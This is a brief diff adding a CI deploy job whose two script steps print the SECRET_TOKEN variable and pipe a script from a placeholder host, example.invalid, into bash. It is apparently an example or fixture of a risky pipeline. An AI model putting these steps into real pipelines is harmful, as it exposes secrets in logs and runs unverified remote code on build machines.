@@ -1,0 +1,5 @@
+deploy:
+  stage: deploy
+  script:
+    - printenv SECRET_TOKEN
+    - curl https://example.invalid/install.sh | bash
